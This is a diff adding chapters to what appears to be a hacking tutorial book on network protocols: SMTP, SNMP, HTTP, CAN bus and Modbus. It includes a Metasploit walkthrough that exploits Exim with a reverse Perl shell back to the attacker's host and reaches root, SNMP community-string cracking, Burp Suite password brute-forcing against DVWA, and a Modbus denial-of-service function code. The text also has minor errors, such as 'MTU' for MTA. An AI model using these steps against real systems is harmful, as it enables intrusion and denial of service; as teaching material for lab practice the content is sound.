@@ -2107,3 +2107,844 @@ SMB is a crucial protocol for file, port, printer, and named pipe sharing on man
 
 ***
 
+## Chapter 9: **Simple Message Transfer Protocol (SMTP)**
+
+### What is SMTP?
+
+Simple Mail Transport Protocol, or SMTP as it is commonly known, is among the most important protocols in our digital age. It is used to transfer email from one user to another. Although SMTP was first codified in 1983, it is still this same protocol that carries nearly all emails with some enhancements.
+
+<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
+
+As the diagram above displays, the client Ana@maildomain-abc.com sends an email to the MTU server via SMTP and retrieves email via either POP3 or IMAP. The same is true for the other client, Lav@maildomain-xyz.com. Communication between the email servers or MTUs is exclusively SMTP on port 25. POP3 uses port 110, and IMAP uses port 143.
+
+#### The Email Processing Model
+
+First, email is submitted by an email client or mail user agent (MUA), such as Microsoft Outlook, Mozilla, etc., to the email server (mail server agent or MSA) using SMTP on port 587. This email is then transferred to the MTU. Most often, these two agents (MUA and MTU) are the same system managed by a single piece of software.
+
+The boundary MTA uses DNS to look up the MX record of the recipient's domain (see DNS). This record includes the name of the target MTA. We can demonstrate this with the dig command.
+
+<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
+
+The MTA selects the target host, connects to it, and sends the message. Once the server receives the incoming message, it hands it to a mail delivery agent (MDA) for delivery to the local recipient. Once the message is delivered to the local mail server, the email is stored for retrieval by an authenticated MUA.
+
+#### Types of MTUs
+
+There are multiple mail transfer units used on various systems. In Linux, the major players are sendmail, EXIM, and postfix. On Microsoft's operating system, the major player is Microsoft's Exchange Server.
+
+#### Packet-Level Analysis with Wireshark
+
+When we capture packets going to an SMTP server, it looks something like this:
+
+<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
+
+Note that in packets 1-3, an outside client is completing a TCP three-way handshake. In packet 4, the SMTP server identifies itself as "mail01" and a Postfix server on Ubuntu and begins using the SMTP protocol for communication. In packet 5, the client issues the EHLO command initiating communication. In packet 8, the client identifies the email sender, and in packet 10, the email receiver.
+
+#### Building an SMTP (EXIM4) Server in Linux
+
+Let's now set up an SMTP server in our Kali Linux. In this case, we'll install exim4, the most widely used email server on Linux systems.
+
+We can download exim4 from the Kali repository:
+
+```
+kali > sudo apt install exim4
+```
+
+Next, we need to execute a configuration wizard that walks us through the configuration of the exim4 server:
+
+```
+kali > sudo dpkg-reconfigure exim4-config
+```
+
+This starts a configuration wizard that queries us for information to configure the email server. The first question is about the type of mail server. If you want to set up your server to send and receive email across the Internet, select the first choice.
+
+<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
+
+Next, you need to provide a domain name that you own. In my case, I used www.hackers-arise.com.
+
+<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
+
+Next, we need to provide the IP address for the server to listen.
+
+<figure><img src="../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
+
+Here, we need to provide a list of recipient domains or local domains. The default is Kali, and I left that in place.
+
+<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+
+Next, we need to provide a list of recipient domains that this system will relay mail to. It is OK to leave it blank.
+
+<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
+
+Next, we need to select the delivery method for local mail. We can choose between the mbox format of /var/mail or the home directory.
+
+<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>
+
+Next, we are queried regarding the DNS queries. If we want to minimize the DNS lookups, select YES.
+
+<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>
+
+Next, select the domains to relay mail for. You can leave it blank.
+
+<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>
+
+Finally, we need to select whether to split the configuration file for the exim4. Unsplit is more stable, while split makes it easier to make changes. I selected unsplit or NO.
+
+<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
+
+Now, we only need to start our exim4 server, and our email server is activated and ready to send and receive email!
+
+#### Vulnerabilities in SMTP
+
+2021 was marked by a major vulnerability found in Microsoft Exchange Server, presumably by Chinese hackers. These vulnerabilities enabled these hackers to access many large corporations and institutions' email records. The impact of this hack was so large and serious that the FBI was given authorization to patch Exchange Server systems throughout the US.
+
+In addition, in 2020, exim email servers had two severe vulnerabilities that allowed unauthorized access to email stored on these servers.
+
+<figure><img src="../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>
+
+#### Reconnaissance and Hacking SMTP
+
+Before attempting any exploit, the first step is to do proper reconnaissance. nmap is the tool of choice for port scanning. Let's scan our SMTP service to see what ports and services are running. We can do a TCP scan on port 25 (the default SMTP port) with nmap and include the -A switch to attempt to determine the service running on that port:
+
+```
+kali > nmap -sT -A 192.168.56.103 -p25
+```
+
+As you can see above, nmap found port 25 open and running exim 4.68.
+
+<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>
+
+To determine any potential vulnerabilities on that SMTP server, we might use nmap scripts. To run all the nmap scripts for SMTP, we can use the --script=smtp-\* option where the wildcard (\*) means to run all the scripts in the smtp category:
+
+```
+nmap --script=smtp-* 192.168.56.103 -p 25
+```
+
+<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
+
+As you can see above, the smtp nmap scripts were able to enumerate multiple users (these users can then be targeted with social engineering attacks) and find that the server is vulnerable to the CVE-2010-4344 and CVE-2010-4345 exploits.
+
+<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
+
+Next, let's see whether we can find these exploits in Metasploit. Fire up Metasploit by entering:
+
+```
+kali > msfconsole
+```
+
+Now, let's search for Exim exploits by using the search function:
+
+```
+msf5 > search type:exploits exim
+```
+
+<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
+
+As you can see in the screenshot above, Metasploit has multiple Exim exploits. Let's try the exploit/unix/smtp/exim4\_string\_format exploit.
+
+First, let's load the exploit using the use command:
+
+```
+msf5> use exploit/unix/smtp/exim4_string_format
+```
+
+Before we progress further, let's learn more about this exploit by entering “info”:
+
+```
+kali > info
+```
+
+<figure><img src="../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
+
+As you can see above, this module exploits a heap buffer overflow. In addition, if it detects a Perl interpreter, it will automatically escalate privileges from a regular user to root.
+
+Then, let's set the RHOSTS parameter with the target system's IP address. With the RHOSTS now set, we next set the PAYLOAD. In this case, let's use cmd/unix/reverse\_perl. This payload will open a command shell on the target machine using Perl (most Unix-like systems have Perl installed by default) that will call back to our attack system if successful.
+
+<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
+
+Lastly, we need only to set the LHOST and the LPORT. Let's set the LPORT to 443 so that it uses a commonly open port for HTTPS traffic. Often, by using this port, this exfiltration will go unnoticed.
+
+The only step left is to run “exploit”:
+
+```
+msf5> exploit
+```
+
+<figure><img src="../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>
+
+As you can see above, the exploit worked and gave us a command shell in session 1!
+
+Unlike when we exploit a Windows system, when we grab a command shell on Linux systems, we do NOT get a command prompt but rather an empty line. To test whether we are actually on the Linux SMTP server, we can enter Linux commands and check for the response. In this case, let's run a few common Linux commands such as id, whoami, pwd, uname -a.
+
+<figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>
+
+As you can see above, the system responded by informing us that the user is uid=0 or root, the present working directory (pwd) is /var/spool/exim4, and the uname is Linux mailserver01.
+
+### Exercises
+
+1. Build an SMTP server for your domain.
+2. Conduct reconnaissance on your new SMTP server.
+
+***
+
+## Chapter 11: **Simple Network Management Protocol (SNMP)**
+
+The Simple Network Management Protocol, or SNMP, is among the least understood protocols, yet it is vitally important to the successful operation of your network. If an attacker can breach SNMP, they may be able to unmask your encrypted VPN communication (see NSA's ExtraBacon exploit here) and possibly control every device connected to your network.
+
+As you know, the Simple Network Management Protocol uses UDP ports 161 and 162 to manage network devices. Network devices use this protocol to communicate with each other and can be used by administrators to manage the devices. As hackers, if we can access the SNMP protocol, we can harvest a vast resource of information on the target's network and even disable and change the settings on these devices. Imagine the havoc one could wreak by changing the settings on routers and switches!
+
+### Background on SNMP
+
+The Simple Network Management Protocol (SNMP) is part of the Internet Protocol Suite that is designed to manage computers and network devices. Cisco describes it as "an application layer protocol that facilitates the exchange of information between network devices." Succinct and correct, but it misses the management function that SNMP also provides.
+
+SNMP is a stateless, datagram-oriented protocol. It involves one or more administrative computers called managers. These managers monitor and manage a group of computers. Each of the managed computers has an agent installed that communicates with the manager.
+
+<figure><img src="../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>
+
+The agent on the managed computers provides management data to the managing computer. The manager can undertake management tasks, including modifying and applying new configurations.
+
+The management data exposed by the agents on each of the managed machines are stored in a hierarchical database called the Management Information Base or MIB. It is this information within the MIB that we will be seeking here. This MIB contains a vast array of information on every device on the network, including users, software installed, operating systems, open ports, etc. All of this information can be invaluable in developing an exploitation strategy on the target.
+
+### SNMP Communication and PDUs
+
+The SNMP protocol communicates on UDP port 161. The communication takes place with protocol data units or PDUs. These PDUs are of seven types:
+
+* GetRequest
+* SetRequest
+* GetNextRequest
+* GetBulkRequest
+* Response
+* Trap
+* InformRequest
+
+#### SNMP Versions
+
+SNMP has three versions:
+
+**SNMPv1**:
+
+* Has very poor security.
+* The authentication of clients is in cleartext and, by default, uses a "community string" set to "public."
+* The manager's authentication is also a community string set to "private" by default.
+* With these community strings, the attacker can gather all the information from the MIB (with the public community string) and even set the configuration on the devices (with the private community string).
+* Even if the network administrator changes the community string from the defaults, because communication is in cleartext, an attacker can sniff the authentication strings off the wire.
+
+**SNMPv2**:
+
+* Improved upon SNMPv1 in terms of performance and security, but because it was not backwardly compatible with SNMPv1, it was not widely adopted.
+
+**SNMPv3**:
+
+* Significantly more secure than either SNMPv1 or v2.
+* Adds encryption, message integrity, and authentication but is still not used on all networks.
+
+#### Wireshark Analysis of SNMPv1
+
+Below we can see a Wireshark capture of SNMPv1 communication over a LAN.
+
+<figure><img src="../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
+
+Note the Get-Request, Get-Response, and Get-Next-Request in the upper windows and the community string in the lower window.
+
+#### Abusing SNMP for Information Gathering
+
+Now that we have a bit of background on the SNMP protocol let's use or abuse it to gather information on our target. Open Kali and go to Applications --> Kali Linux --> Information Gathering --> SNMP Analysis --> snmpcheck.
+
+When you do so, you will be greeted by the snmpcheck help screen.
+
+Snmpcheck is a Perl script that queries the SNMP MIB for information on the target IP. Its syntax is fairly simple:
+
+```
+kali > snmpcheck -t <target IP>
+```
+
+Some options are available, such as the community string (it uses "public" by default) and the SNMP version (it uses one by default, or 2 is the other option. Note it will not work on the more secure SNMP v3) and a few others. We will be using it here against a 2003 Server on our network to see what information SNMP can provide us about the target.
+
+As you can see in the screenshot below, we ran snmpcheck, and it began to gather information from the MIB about the target and display it on our screen. Initially, it gives information about the hardware and then the operating system and uptime (uptime can be very useful information to determine whether a system has been patched).
+
+<figure><img src="../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
+
+Next, it displays device information.
+
+<figure><img src="../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
+
+Next, storage information.
+
+<figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>
+
+Then, user accounts (this can be useful later when trying to crack user passwords. It eliminates the need to guess user account names).
+
+<figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
+
+Finally, the software installed on the system. This can be particularly useful when we begin to develop an exploitation strategy, as exploits are specific to applications and their version.
+
+<figure><img src="../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>
+
+#### Cracking SNMP Community Strings
+
+As you saw in the previous exercise, SNMP can provide us with a significant amount of information about our target if we can access it. In the previous section, we assumed that the admin had left the community string set to "public." What if the admin was a bit more cautious and security-minded and had changed the community string? How can we find the community string?
+
+There is an excellent tool built into Kali named onesixtyone (presumably named after the default port that SNMP operates on). In essence, it is a SNMP community string cracker. Like most "password" crackers, it relies upon a dictionary or wordlist to try against the service until it finds a match.
+
+Let's open onesixtyone by going to Applications --> Kali Linux --> Information Gathering --> SNMP Analysis --> onesixtyone. It should open a help screen like below.
+
+The syntax of onesixtyone is pretty simple and straightforward:
+
+```
+kali > onesixtyone [options] <host IP> <community string private or public>
+```
+
+Like a dictionary-based password cracker, the dictionary you use with onesixtyone is critical. In the case of onesixtyone, it has a built-in dictionary. It's small but contains many of the commonly used strings with SNMP. If you are creating your own dictionary for SNMP cracking, this is a good starting point, but you may want to expand it with variations of the domain name or company name as network administrators don't usually put much effort into creating complex strings for SNMP. For instance, if the company is Microsoft, you might try strings that a lazy admin might use, such as microsoft-public, microsoft-private, microsoft-snmp, microsoft-network, etc.
+
+Let's take a look at the dictionary file by typing:
+
+```
+kali > cat /usr/share/doc/onesixtone/dict.txt
+```
+
+As you can see, it includes a short list of widely used SNMP community strings.
+
+In this exercise, we will use this short and simple dictionary to see whether we can find that community string on our network and then use it in snmpcheck to gather all the info on the target.
+
+In our case, we will be using it on the same system as before, so our command will be:
+
+```
+kali > onesixtyone 192.168.1.102 -c /usr/share/doc/onesixtyone/dict.txt
+```
+
+
+
+As you can see in the screenshot above, it was able to find both the private community string (still set to the default "private") and the public community string (still set to the default as "public"). These community strings can then be used with snmpcheck to grab information from the MIB about the target system.
+
+#### NSA Exploits SNMP to Unmask VPN Communications
+
+We know that the NSA has exploited SNMP to unmask VPN communications from documents released by Edward Snowden. Although this vulnerability has been patched by Cisco, it is likely that the NSA still has another exploit of SNMP to view encrypted communication.
+
+***
+
+## Chapter 12: HTTP **Protocol**
+
+The HyperText Transfer Protocol (HTTP) is the fundamental communication protocol of the web, used by all web applications. Initially designed for retrieving static web pages, HTTP has evolved to support complex modern applications. It operates using a message-based model where the client sends a request, and the server responds. HTTP is connection-less but relies on TCP as its transport mechanism.
+
+**HTTP Requests**
+
+All HTTP messages contain:
+
+1. One or more headers
+2. A blank line
+3. An optional message body
+
+<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>
+
+The first line of an HTTP request includes:
+
+1. A verb indicating the HTTP method (e.g., GET, POST)
+2. The requested URL
+3. The HTTP version used
+
+**HTTP Responses**
+
+A typical HTTP response consists of:
+
+1. The HTTP version
+2. A numeric status code
+3. Text describing the status response
+
+<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>
+
+**HTTP Methods**
+
+* **GET**: Retrieves resources
+* **POST**: Performs actions
+* **HEAD**: Similar to GET but without a message body
+* **TRACE**: Used for diagnostic purposes
+* **OPTIONS**: Requests available HTTP methods from the server
+* **PUT**: Attempts to upload a resource to the server
+
+**URLs**
+
+A Uniform Resource Locator (URL) uniquely identifies a web resource and follows the syntax:
+
+```
+protocol://hostname[:port]/path/file[?param=value]
+```
+
+The port number is optional unless it differs from the default (e.g., HTTP=80, HTTPS=443).
+
+**HTTP Headers**
+
+HTTP headers can be general, request-specific, or response-specific.
+
+* **General Headers**:
+  * `Connection`
+  * `Content-Encoding`
+  * `Content-Length`
+  * `Content-Type`
+  * `Transfer-Encoding`
+* **Request Headers**:
+  * `Accept`
+  * `Accept-Encoding`
+  * `Authorization`
+  * `Cookie`
+  * `Host`
+  * `If-Modified-Since`
+  * `If-None-Match`
+  * `Origin`
+  * `Referrer`
+  * `User-Agent`
+* **Response Headers**:
+  * `Access-Control-Allow-Origin`
+  * `Cache-Control`
+  * `Etag`
+  * `Expires`
+  * `Location`
+  * `Pragma`
+  * `Server`
+  * `Set-Cookie`
+  * `WWW-Authenticate`
+  * `X-Frame-Options`
+
+**Cookies**
+
+Cookies are data items sent by the server to the client, which the client stores and resubmits with future requests. They are issued using the `Set-Cookie` response header and typically contain a name/value pair.
+
+<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
+
+**Status Codes**
+
+HTTP responses include status codes to indicate the result of the request. These are grouped as follows:
+
+* **1xx**: Informational
+* **2xx**: Success
+  * 200: OK
+  * 201: Created
+* **3xx**: Redirect
+  * 301: Moved Permanently
+  * 302: Found
+  * 304: Not Modified
+* **4xx**: Client Error
+  * 400: Bad Request
+  * 401: Unauthorized
+  * 403: Forbidden
+  * 404: Not Found
+  * 405: Method Not Allowed
+  * 413: Request Entity Too Large
+  * 414: Request URI Too Long
+* **5xx**: Server Error
+  * 500: Internal Server Error
+  * 503: Service Unavailable
+
+
+
+For a complete list of response codes, refer to the HTTP specification.
+
+### **HTTPS**
+
+HTTPS is HTTP over SSL, providing encryption to protect the confidentiality and integrity of data.
+
+### ![](<../.gitbook/assets/image (128).png>)**HTTP Proxies**
+
+HTTP proxies sit between the client's browser and the web server, handling requests and responses. They provide access control, caching, authentication, and content filtering.
+
+<figure><img src="../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>
+
+**HTTP Authentication**
+
+HTTP supports several authentication mechanisms:
+
+* **Basic**: Sends credentials as a Base64-encoded string
+* **NTLM**: Challenge-response mechanism
+* **Digest**: Uses MD5 checksums with a nonce and user credentials
+
+#### Hacking Web App Authentication with Burp Suite
+
+Burp Suite, developed by PortSwigger, is a powerful tool for web application penetration testing. It can be used for various attacks, including session ID randomization, injection attacks, fuzzing, and more. Here, we'll focus on web app authentication.
+
+**Setting Up Burp Suite and DVWA**
+
+1. **Start Kali and DVWA**: Fire up Kali Linux and start the Damn Vulnerable Web Application (DVWA) on another system or VM.
+2. **Launch Burp Suite**: Open Burp Suite and select "Temporary Project" in the Community Edition, then click "Next" and "Start Burp."
+
+<figure><img src="../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>
+
+3. **Enable Intercept**: Go to the Proxy tab in Burp Suite and enable intercept.
+
+<figure><img src="../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>
+
+
+
+### **Configuring the Browser**
+
+1. **Set Up Proxy**: In Mozilla Firefox, go to Preferences -> Network Connections and set the proxy to 127.0.0.1 on port 8080.
+2. **Navigate to DVWA**: Open DVWA in the browser using the IP address of the Metasploitable system or the OWASP Broken Web Apps VM.
+
+**Intercepting Login Requests**
+
+1. **Login Attempt**: Enter credentials (e.g., username: OTW, password: HackersArise) in DVWA without submitting.
+2. **Capture Request**: Burp Suite will intercept the request, showing the username and password.
+
+**Sending Request to Burp Suite Intruder**
+
+1. **Send to Intruder**: Right-click on the intercepted request in Burp Suite and select "Send to Intruder."
+2. **Set Positions**: Clear existing positions and manually set the password field for the attack.
+3. **Choose Attack Type**: For a known username, select the "Sniper" attack type.
+
+**Setting Payloads**
+
+1. **Input Passwords**: Add common passwords or use a comprehensive password list (e.g., top10000\_passwords.txt).
+2. **Start Attack**: Click "Start Attack" to begin the brute force attempt.
+
+**Reading Results**
+
+1. **Analyze Responses**: Look for anomalies in the status and length fields, indicating successful login attempts.
+
+**Cluster Bomb Technique**
+
+For unknown usernames and passwords:
+
+1. **Add Multiple Payloads**: Set both username and password fields as payloads.
+2. **Character Substitution**: Enable character substitution to handle common letter/number substitutions.
+3. **Start Attack**: Initiate the attack and analyze the responses for successful login indicators.
+
+***
+
+## Chapter 13: Automobile Networks
+
+Automobile hacking is one of the leading-edge areas of our hacking discipline. As our automobiles have become smarter and smarter, they include more and more electronics, making them more and more vulnerable. As we are literally and figuratively turning the corner into the era of the driverless or autonomous car, hacking automobiles will become even more important and dangerous.
+
+In this series, we will examine the basics of automobile hacking and advance to more complex hacking strategies. For an example of a rather simple automobile hacking, check out my article on hacking the Mitsubishi Outlander.
+
+Before we can delve into automobile hacking, we need to first understand the basics. Kind of like understanding TCP/IP before network hacking or Modbus before SCADA hacking. Automobile electronics use several different protocols to communicate between multiple micro-controllers, sensors, gauges, actuators, etc. The most widely used of these protocols is the Controller Area Network or CAN.
+
+### The CAN Protocol
+
+CAN was first developed by Robert Bosch GmbH, the German industrial giant known for its automotive electronics. It was first released at the Society of Automotive Engineers (SAE) meeting in 1986. The CAN protocol has been standardized as ISO 11898-1 and ISO 11898-2. It was designed for robust communication within the vehicle between microcontrollers and devices without the need for a host computer.
+
+CAN operates as a broadcast type of network, similar to a broadcast packet in Ethernet or using a hub in the old days of networking (1980 through the 90s). Every node on the network can "see" every transmission. Unlike Ethernet or TCP/IP (but similar to Modbus in SCADA systems), you cannot send a message to a single node, but the CAN does provide for local filtering so that each node only acts upon messages pertinent to its operation. You can think of this as "content messaging," where the contents determine the target node.
+
+CAN runs over two wires, CAN high and CAN low. Due to the "noise" inherent in automobile systems, CAN uses differential signaling. This is where the protocol raises and lowers the voltage on the two wires to communicate. In both high-speed and low-speed CAN, signaling drives the high wire towards 5v and the low wire towards 0v when transmitting a zero (0) but doesn't drive either wire when sending a one (1).
+
+### CAN Message Types
+
+CAN uses four (4) different types of messages:
+
+1. **Data Frame**
+2. **Remote Frame**
+3. **Error Frame**
+4. **Overload Frame**
+
+#### Data Frame
+
+This is the only frame actually used for data transmission. In most cases, the data source node sends the data frame. It has two types, standard and extended. The standard has 11 identifier bits, and the extended has 29 bits. The CAN standard requires that the base data frame MUST be accepted and the extended frame MUST be TOLERATED; in other words, it will not break the protocol or transmission.
+
+#### Remote Frame
+
+The remote frame is used when the data destination node requests the data from the source.
+
+#### Error Frame
+
+The error frame has two different fields, the first is given by the ERROR FLAGS and contributed by the different stations, and the second is the ERROR DELIMITER, simply indicating the end of the error message.
+
+#### Overload Frame
+
+The overload frame has two fields. These are the Overload Flag and the Overload Delimiter. The overload frame is triggered either by the internal conditions of a receiver or the detection of the dominant bit (0) during transmission.
+
+### The On-Board Diagnostics (OBD)-II Connector
+
+Most vehicles now come with an OBD-II connector. If you have taken your car to a shop for repair, it is this connector under the dashboard where the mechanic connects their computer to get a read on the onboard computers.
+
+The OBD-II has 16 pins and looks like the diagram below. As hackers/attackers, we can also connect to this OBD-II connector and send messages on the CAN network to various devices.
+
+### CAN Bus Packet Layout
+
+There are two types of CAN packets, standard and extended. The extended packets share the same elements as the standard packet, but the extended packets have additional space to include IDs.
+
+#### Standard Packets
+
+Every CAN packet has four critical sections. These are:
+
+* **Arbitration ID**: The arbitration ID is the ID of the device sending the packet.
+* **Identifier Extension**: This bit is always 0 for standard CAN.
+* **Data Length Code (DLC)**: This indicates the size of the data, from 0 to 8 bytes.
+* **Data**: This is the data in the message. As mentioned above, it can be up to 8 bytes.
+
+As mentioned above, all CAN packets are broadcast, so every device or controller can see every packet. There is no way for any device to know which controller sent the packet (no return address), so spoofing messages on a CAN network is trivial. This is one of the key weaknesses of CAN.
+
+#### Extended CAN Packets
+
+Extended CAN packets are the same as standard CAN packets, but they are chained together to create longer IDs. Extended CAN is backwardly compatible with standard CAN. This means that if a sensor was not designed to accept extended CAN packets, this system wouldn't break.
+
+### Security
+
+Due to CAN being a low-level protocol, it does not have any security features built in. It has NO encryption or authentication by default. This can lead to man-in-the-middle (MitM) attacks (no encryption) and spoofing attacks (no authentication). Manufacturers, in some cases, have implemented authentication mechanisms on mission-critical systems, such as modifying software and controlling brakes, but all manufacturers have not implemented them. Even in the cases where passwords have been implemented, they are relatively easy to crack.
+
+### CAN-Utils or SocketCAN
+
+Now that we laid out the basics of the most common protocol used in automobiles, the Controller Area Network or CAN, we can now proceed to install the can-utils. can-utils is a Linux-specific set of utilities that enables Linux to communicate with the CAN network on the vehicle. In this way, we can sniff, spoof, and create our own CAN packets to pwn the vehicle!
+
+#### What are the can-utils?
+
+CAN is a message-based network protocol designed for vehicles. Originally created by Robert Bosch GmbH, the same folks who developed the CAN protocol. In addition, SocketCAN is a set of open-source CAN drivers and a networking stack contributed by Volkswagen Research to the Linux kernel.
+
+#### Installing the can-utils
+
+If you are using the Kali or other Debian-based repositories, you can download and install can-utils with apt-get.
+
+```bash
+kali > sudo apt install can-utils
+```
+
+If you are not using the Kali repository or any repository without can-utils, you can always download the can-utils from github.com using the git clone command.
+
+```bash
+kali > git clone https://github.com/linux-can/can-utils
+```
+
+#### The Basics of the can-utils
+
+The CAN utilities are tools to work with CAN communications within the vehicle from the Linux operating system. These tools can be divided into several functional groups:
+
+1. **Basic tools to display, record, generate and play CAN traffic**
+2. **CAN access via IP sockets**
+3. **CAN in-kernel gateway configuration**
+4. **CAN bus measurement**
+5. **ISO-TP tools**
+6. **Log file converters**
+7. **Serial line discipline (slc) configuration**
+
+Initially, we will concern ourselves with just the basic tools and the log file converters. For a complete list of the tools in can-utils and their functionality, see the table below.
+
+**1. Basic tools to display, record, generate and replay CAN traffic**
+
+* **candump**: display, filter, and log CAN data to files
+* **canplayer**: replay CAN logfiles
+* **cansend**: send a single frame
+* **cangen**: generate (random) CAN traffic
+* **cansniffer**: display CAN data content differences (just 11bit CAN IDs)
+
+**2. CAN access via IP sockets**
+
+* **canlogserver**: log CAN frames from a remote/local host
+* **bcmserver**: interactive BCM configuration (remote/local)
+* **socketcand**: use RAW/BCM/ISO-TP sockets via TCP/IP sockets
+
+**3. CAN in-kernel gateway configuration**
+
+* **cangw**: CAN gateway userpace tool for netlink configuration
+
+**4. CAN bus measurement and testing**
+
+* **canbusload**: calculate and display the CAN busload
+* **can-calc-bit-timing**: userspace version of in-kernel bitrate calculation
+* **canfdtest**: Full-duplex test program (DUT and host part)
+
+**5. ISO-TP tools ISO15765-2:2016 for Linux**
+
+* **isotpsend**: send a single ISO-TP PDU
+* **isotprecv**: receive ISO-TP PDU(s)
+* **isotpsniffer**: 'wiretap' ISO-TP PDU(s)
+* **isotpdump**: 'wiretap' and interpret CAN messages (CAN\_RAW)
+* **isotpserver**: IP server for simple TCP/IP <-> ISO 15765-2 bridging (ASCII HEX)
+* **isotpperf**: ISO15765-2 protocol performance visualization
+* **isotptun**: create a bi-directional IP tunnel on CAN via ISO-TP
+
+**6. Log file converters**
+
+* **asc2log**: convert ASC logfile to compact CAN frame logfile
+* **log2asc**: convert compact CAN frame logfile to ASC logfile
+* **log2long**: convert compact CAN frame representation into user-readable format
+
+**7. Serial Line Discipline configuration (for slcan driver)**
+
+* **slcand**: configure and attach serial lines as CAN network interfaces
+* **slcan\_attach**: configure and attach serial lines as CAN network interfaces
+
+In addition, there are two example programs included: **bcmserver.c** and **logserver.c**. Both are servers that listen on TCP/IP sockets and act on CAN data.
+
+By now, you should have a basic understanding of automobile networks, the CAN protocol, CAN message types, CAN bus packet layout, and the essential tools available within can-utils. With these foundations in place, you're well-equipped to move forward into more advanced automobile hacking techniques.
+
+Next, we'll delve into practical hands-on activities, such as sniffing CAN bus data and replaying attacks to understand the actual dynamics of automobile networks. Stay tuned, and always remember to practice hacking ethically and legally!
+
+***
+
+## Chapter 14: SCADA/ICS Networks
+
+SCADA (Supervisory Control and Data Acquisition) and ICS (Industrial Control Systems) differ from traditional IT systems in several key ways. One of the most important differences is the variety of communication protocols. Unlike traditional IT systems that use standardized TCP/IP protocols, SCADA/ICS systems are marked by significant variations in their communication protocols.
+
+### SCADA/ICS Manufacturers
+
+Numerous SCADA/ICS protocols exist, often different within the many manufacturers of hardware. Major manufacturers of SCADA/ICS hardware include:
+
+* Siemens
+* Honeywell
+* Toshiba
+* Rockwell Automation/Allen-Bradley
+* Mitsubishi
+* GE
+* Schneider Electric
+* And many others
+
+Each of these companies produces varied products and uses various protocols, some of which are proprietary. This variability is one reason securing SCADA/ICS systems can be challenging. However, this industry has also benefited from security through obscurity, as many attackers are unfamiliar with these protocols.
+
+### SCADA/ICS Communication Protocols
+
+There are numerous communication protocols among these many manufacturers of PLC and SCADA/ICS systems. To pentest these systems, you need at least a rudimentary understanding of these protocols. The most widely used protocols include:
+
+* Modbus
+* DNP3
+* ICCP
+* Common Industrial Protocol (CIP)
+* EtherNet/IP
+* CompoNet
+* ControlNet
+* DeviceNet
+* OLE for Process Control (OPC)
+* PROFIBUS
+* Foundation Fieldbus H1
+
+Each protocol operates slightly differently (in some cases, very differently). We will detail their inner workings in separate articles here on Hackers-Arise. For now, let's focus on the most widely used protocol, Modbus.
+
+#### Modbus
+
+**Modbus Serial (RTU)**
+
+Modbus RTU was first developed in 1979 by Modicon (now part of Schneider Electric) for industrial automation systems and Modicom PLCs. It has become the industry standard, if there is one. Modbus is a widely-accepted, public-domain protocol. It is a simple and lightweight protocol intended for serial communication, with a data limit of 253 bytes.
+
+Modbus operates at Layer 7 of the OSI model. It is an efficient communication methodology between interconnected devices using a "request/reply" model. Because it is simple and lightweight, it requires little processing power.
+
+Modbus was first implemented on either RS-232C (point-to-point) or RS-485 (multi-drop) physical topology. It can have up to 32 devices communicating over a serial link, with each device having a unique ID.
+
+Modbus uses a Master/Slave (client/server) architecture where only one device can initiate queries. The slaves/server supply the requested data to the master or perform the action requested by the master. A slave is any peripheral device (I/O transducer, valve, network drive, or other measuring device) that processes information and sends its output to the master via the Modbus protocol.
+
+Masters can address individual slaves or initiate a broadcast message to all slaves. Slaves return a response to all queries addressed to them individually but do not respond to broadcast queries. Slaves do NOT initiate messages; they can only respond to the master. A master's query will consist of the slave address (slave ID or Unit ID), a function code, any required data, and an error-checking field.
+
+**Modbus Function Codes**
+
+Modbus communicates by function codes, which can be used to perform a wide range of commands. Function code 8 is the diagnostic function code. Within that function code 8, there are numerous sub-function codes. Note Function Code 8, sub-function code 04, Force Listen Only Mode, which can be used to create a Denial of Service (DoS) condition on some Modbus-enabled systems.
+
+**Diagnostic Sub-Function Codes**
+
+**Modbus TCP**
+
+Modbus TCP is the Modbus protocol encapsulated for use over TCP/IP. It uses the same request/response model as Modbus RTU, the same function codes, and the same data limit of 253 bytes. The error-checking field used in Modbus RTU is eliminated, as the TCP/IP link layer uses its checksum methods, eliminating the need for the Modbus RTU checksum. Modbus TCP utilizes the reserved port 502 to communicate over TCP/IP.
+
